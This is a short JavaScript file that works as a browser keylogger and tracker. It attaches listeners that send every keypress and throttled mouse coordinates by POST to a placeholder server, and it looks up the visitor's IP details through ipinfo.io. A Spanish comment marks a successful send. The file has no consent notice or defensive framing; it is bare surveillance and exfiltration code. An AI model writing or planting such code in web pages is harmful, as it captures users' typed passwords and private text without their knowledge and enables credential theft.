function getIP(){

	var xhr = new XMLHttpRequest();
	xhr.open('GET', "https://ipinfo.io/json", true);
	xhr.send();
	 
	xhr.onreadystatechange = processRequest;
	function processRequest(event) {
		if (xhr.readyState == 4 && xhr.status ==200) {
			var response = JSON.parse(xhr.responseText);
			return response;
		}
	}		
}

//Send POST request
function sendData(f,value){
	var url = "http://0.0.0.0/"+f+"?"+"param="+value;
	var xhr = new XMLHttpRequest();
	xhr.open('POST', url , true);
	xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
	xhr.send();
	 
	xhr.onreadystatechange = processRequest;
	function processRequest(event) {
		if (xhr.readyState == xhr.DONE && xhr.status==200){
			console.log("envió, no sé si bien o mal o qué pero envió");
		}
	}		
}

function getKey() {
	document.addEventListener("keypress", function onEvent(event) {
		//console.log(event.key);
		sendData("key",event.key);
	});
}

function mousePosition(){


	let handleMousemove = (event) => {
		//Print positions
		//console.log(`${event.x},${event.y}\n`);
		sendData("xmouse",event.x);
		sendData("ymouse",event.y);
		};

	let throttle = (func, delay) => {
	  let prev = Date.now() - delay;
	  return (...args) => {
	    let current = Date.now();
	    if (current - prev >= delay) {
	      prev = current;
	      func.apply(null, args);
	    }
	  }
	};

	document.addEventListener('mousemove', throttle(handleMousemove, 200));
}
